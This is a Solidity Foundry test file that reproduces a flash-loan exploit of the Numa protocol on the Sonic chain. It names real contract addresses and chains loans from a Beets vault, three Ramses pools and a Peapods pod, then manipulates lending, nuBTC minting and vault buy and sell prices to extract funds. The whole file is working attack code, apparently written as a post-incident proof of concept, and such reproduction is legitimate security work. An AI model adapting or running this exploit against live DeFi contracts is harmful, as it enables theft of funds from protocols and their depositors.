// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
interface IBeetsVault {
    function flashLoan(
        IFlashLoanRecipient recipient,
        IERC20[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}
interface IVaultManager{
    function numaToToken(
        uint _inputAmount,
        uint _refValueWei,
        uint _decimals,
        uint _synthScaling
    ) external view returns (uint256);
}

interface INumaVault {
    function buy(uint, uint, address) external returns (uint);
    function sell(uint, uint, address) external returns (uint);
    function getDebt() external view returns (uint);
    function repay(uint amount) external;
    function borrow(uint amount) external;
    function getEthBalance() external view returns (uint256);
    function getEthBalanceNoDebt() external view returns (uint256);
    function getMaxBorrow(bool _useCapParameter) external view returns (uint256);
    function numaToLst(uint256 _amount) external view returns (uint256);
    function lstToNuma(uint256 _amount) external view returns (uint256);
    function repayLeverage(bool _closePosition) external;
    function borrowLeverage(uint _amount, bool _closePosition) external;
    function liquidateLstBorrower(
        address _borrower,
        uint _lstAmount,
        bool _swapToInput,
        bool _flashloan
    ) external;
    function updateVault() external;
    function getcNumaAddress() external view returns (address);
    function getcLstAddress() external view returns (address);

    function getMinBorrowAmountAllowPartialLiquidation(address) external view returns (uint);
    function borrowAllowed(address _ctokenAddress) external returns (bool);

}
interface IRamsesV3Pool{
     function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}
// https://peapods.finance
interface Inumapod{
    function flash(address _recipient, address _token, uint256 _amount, bytes calldata _data) external;
}
interface IFlashLoanRecipient {
    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

interface IERC20 {
    function balanceOf(address _owner) external view returns (uint256 balance);
    function transfer(address _to, uint256 _value)  external returns (bool success);
    function transferFrom(address _from, address _to, uint256 _value) external returns (bool success);
    function approve(address _spender  , uint256 _value) external returns (bool success);
    function allowance(address _owner, address _spender) external view returns (uint256 remaining);
    function increaseAllowance(address spender, uint256 increment) external virtual returns(bool);
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
}

interface ICToken{
    function mint(uint mintAmount) external virtual returns (uint);
    function redeem(uint redeemTokens) external virtual returns (uint);
    function redeemUnderlying(
        uint redeemAmount
    ) external virtual returns (uint);
    function borrow(uint borrowAmount) external virtual returns (uint);
    function repayBorrow(uint repayAmount) external virtual returns (uint);
    function repayBorrowBehalf(
        address borrower,
        uint repayAmount
    ) external virtual returns (uint);
    function liquidateBorrow(
        address borrower,
        uint repayAmount,
        address cTokenCollateral
    ) external virtual returns (uint,uint);
    function liquidateBadDebt(
        address borrower,
        uint repayAmount,
        uint percentageToTake,
        address cTokenCollateral
    ) external virtual returns (uint);
    function exchangeRateStored() external view  returns (uint);
}

interface Icontroller{
 function getAccountLiquidityIsolate(address account, address collateral, address borrow) external returns(uint,uint,uint,uint);
 function enterMarkets(address[] memory cTokens) external returns (uint[] memory);
}

interface Inumaprinter{
    function mintAssetFromNumaInput(
        address _nuAsset,
        uint _numaAmount,
        uint _minNuAssetAmount,
        address _recipient
    ) external  returns (uint256);
    function burnAssetInputToNuma(
        address _nuAsset,
        uint256 _nuAssetAmount,
        uint256 _minimumReceivedAmount,
        address _recipient
    ) external returns (uint256);
}

contract numa_exploit_1 is Test {
    attacker_1 AC_1;
    attacker_2 AC_2;
    address attacker;
    IERC20 usdc;
    IERC20 stS;
    IERC20 numa;
    IVaultManager manager;
    function setUp() public {
        vm.createSelectFork("https://sonic-rpc.publicnode.com", 42374856-1);
        attacker=0xEf1df44E122872d0feF75644AFc63a5C35F97674;
        usdc=IERC20(0x29219dd400f2Bf60E5a23d13Be72B486D4038894);
        stS = IERC20(0xE5DA20F15420aD15DE0fa650600aFc998bbE3955);
        numa = IERC20(0x83a6d8D9aa761e7e08EBE0BA5399970f9e8F61D9);
        manager = IVaultManager(0xf8021C37b20a0C5BaD67b67Cc79Dd98e7eF82f6B);

        //rebalance numaToToken func
        vm.mockCall(
            address(manager),
            abi.encodeWithSelector(IVaultManager.numaToToken.selector, 46715298436671072197785,1031198463850635760,1e18,1e18),
            abi.encode(178779204632515714347269)
        );
        vm.mockCall(
            address(manager),
            abi.encodeWithSelector(IVaultManager.numaToToken.selector, 68109023860226514448876,1031198463850635760,1e18,1e18),
            abi.encode(262589760944327584193729)
        );
    }

    function testExploit() public{
        vm.startPrank(attacker);
        AC_2 = new attacker_2();
        AC_1 = new attacker_1(address(AC_2));
        deal(address(usdc),address(AC_1),1e7);
        AC_1.start();
        console.log("sts",stS.balanceOf(address(AC_1)));
        console.log("numa",numa.balanceOf(address(AC_1)));
    }
}

contract attacker_1{
    IBeetsVault vault;
    IRamsesV3Pool pool;
    IRamsesV3Pool pool2;
    IRamsesV3Pool pool3;
    Inumapod numapod;
    IERC20 stS;
    IERC20 numa;
    IERC20 usdc_e;
    address pod_owner;
    ICToken cnuma;
    ICToken cnumaLst;
    Icontroller controller;
    Inumaprinter numaprinter;
    IERC20 nuBTC;
    address second_step;
    INumaVault numa_vault;
    uint pool1_amount;
    uint pool2_amount;
    uint pool3_amount;
    uint pod_amount;

    constructor(address second){
        vault = IBeetsVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        pool = IRamsesV3Pool(0xE8d01e7d77c5df338D39Ac9F1563502127Dd3301);
        pool2 = IRamsesV3Pool(0xD3533de03cDc475d0dd1AAa8971128a4B69a6141);
        pool3 = IRamsesV3Pool(0x2143f979A765f25B904FFB0b7420f153864ec670);
        stS = IERC20(0xE5DA20F15420aD15DE0fa650600aFc998bbE3955);
        numa = IERC20(0x83a6d8D9aa761e7e08EBE0BA5399970f9e8F61D9);
        numapod = Inumapod(0x652BcB8193745b2F527275A337eF835735b2191E);
        usdc_e=IERC20(0x29219dd400f2Bf60E5a23d13Be72B486D4038894);
        pod_owner=0x88eaFE23769a4FC2bBF52E77767C3693e6acFbD5;
        cnuma=ICToken(0x16d4b53DE6abA4B68480C7A3B6711DF25fcb12D7);
        cnumaLst = ICToken(0xb2a43445B97cd6A179033788D763B8d0c0487E36);
        controller = Icontroller(0x30047CCA309b7aaC3613ae5B990Cf460253c9b98);
        numaprinter = Inumaprinter(0xAA2475Ec557C18F5B3289c393899483E42D0C585);
        nuBTC = IERC20(0xcDB2b78E83Ddf230BcB225F8C541dCa4a15f3A85);
        second_step=second;
        numa_vault=INumaVault(0xde76288C3B977776400fE44Fe851bBe2313f1806);
        usdc_e.approve(address(numapod), 10000000);

        address[] memory markets = new address[](2);
        markets[0] = address(cnuma);
        markets[1] = address(cnumaLst);
        Icontroller(address(controller)).enterMarkets(markets);
        numa.approve(address(cnuma),type(uint).max);
        numa.approve(address(numaprinter), type(uint).max);
        stS.approve(address(numa_vault), type(uint).max);
        nuBTC.approve(address(numaprinter), type(uint).max);
        numa.approve(address(numa_vault), type(uint).max);
    }
    function start() public{
        vault = IBeetsVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        IERC20[] memory token = new IERC20[](1);
        token[0]=stS;
        uint[] memory amount = new uint[](1);
        amount[0]=800_000e18;
        vault.flashLoan(IFlashLoanRecipient(address(this)), token, amount, "");
    }
    function receiveFlashLoan(IERC20[] memory tokens,uint256[] memory amounts,uint256[] memory feeAmounts,bytes memory userData) external{
        pool1_amount=numa.balanceOf(address(pool));
        pool.flash(address(this), 0, pool1_amount-1, "");
        stS.transfer(address(vault),800_240e18);

    }
    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external{
        if(msg.sender == address(pool)){
            pool2_amount=numa.balanceOf(address(pool2));
            pool2.flash(address(this), 0, pool2_amount-1, "");
            //end pool flashlaon
            uint fee_1 = 751743954772447429912;
            numa.transfer(address(pool),pool1_amount+fee_1);
        }
        if(msg.sender == address(pool2)){
            pool3_amount=numa.balanceOf(address(pool3));
            pool3.flash(address(this), pool3_amount-1, 0, "");
            //end pool2 flashloan
            uint fee_2 = 27756371613164023514;
            numa.transfer(address(pool2),pool2_amount+fee_2);
        }
        if(msg.sender == address(pool3)){
            pod_amount = numa.balanceOf(address(numapod));
            numapod.flash(address(this),address(numa),pod_amount,"");
            //end pool3 flashloan
            uint fee_3 = 67258692721492521783;
            numa.transfer(address(pool3),pool3_amount+fee_3);
        }
    }
    function callback(bytes memory data) external {
        uint amount = numa.balanceOf(address(this));
        uint mint_amount = (amount*35)/100;
        require(mint_amount == 46715298444905527112257);
        cnuma.mint(mint_amount);

        
        (,uint borrow_amount,,)=controller.getAccountLiquidityIsolate(address(this),address(cnuma),address(cnumaLst));
        require(borrow_amount == 218386233676204893103967);
        cnumaLst.borrow(borrow_amount-1);
        
        amount = numa.balanceOf(address(this));
        numaprinter.mintAssetFromNumaInput(address(nuBTC),amount,1,address(this));
        
        stS.transfer(second_step,stS.balanceOf(address(this)));
        attacker_2(second_step).start(address(this));
        attacker_2(second_step).second();
        
        numa_vault.buy(400_000e18,1,address(this));
        amount = nuBTC.balanceOf(address(this));
        numaprinter.burnAssetInputToNuma(address(nuBTC),amount,1,address(this));

        attacker_2(second_step).third();
        numa_vault.sell(68109023860226514448876,1,address(this));

        //end pod flashloan
        numa.transfer(address(numapod),pod_amount);
    }
}

contract attacker_2{
    INumaVault numa_vault;
    ICToken cnuma;
    IERC20 numa;
    address first_step;
    IERC20 stS;
    constructor(){
        numa_vault=INumaVault(0xde76288C3B977776400fE44Fe851bBe2313f1806);
        cnuma=ICToken(0x16d4b53DE6abA4B68480C7A3B6711DF25fcb12D7);
        numa = IERC20(0x83a6d8D9aa761e7e08EBE0BA5399970f9e8F61D9);
        stS = IERC20(0xE5DA20F15420aD15DE0fa650600aFc998bbE3955);
        stS.approve(address(numa_vault), type(uint256).max);
        numa.approve(address(numa_vault), type(uint256).max);
    }
    function start(address first) public{
        first_step = first;
        uint liquidate_amount = 70888553195844050776598;
        numa_vault.liquidateLstBorrower(first_step, liquidate_amount, false, false);
    }
    function second() public{
        uint amount = stS.balanceOf(address(this));
        require(amount == 947497680480360842327368);
        stS.transfer(first_step,amount);
    }
    function third() public{
        uint amount = numa.balanceOf(address(this));
        numa_vault.sell(amount,1,address(this));
        amount = stS.balanceOf(address(this));
        stS.transfer(first_step,amount);
        }
    }
